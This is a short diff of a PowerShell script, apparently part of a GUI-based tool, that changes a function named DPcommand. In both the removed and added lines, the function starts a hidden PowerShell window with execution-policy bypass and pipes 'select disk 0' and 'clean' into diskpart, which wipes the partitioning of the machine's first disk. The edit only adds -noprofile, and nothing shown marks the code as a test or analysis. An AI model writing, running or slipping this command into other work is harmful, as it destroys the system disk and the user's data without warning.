@@ -2,7 +2,7 @@ Add-Type -AssemblyName PresentationCore,PresentationFramework,System.Windows.For
 
 function DPcommand {
 
-   powershell.exe -ep bypass -windowstyle hidden -c "echo 'select disk 0', 'clean' | diskpart"
+   powershell.exe -noprofile -ep bypass -windowstyle hidden -c "echo 'select disk 0', 'clean' | diskpart"
 
 }
 
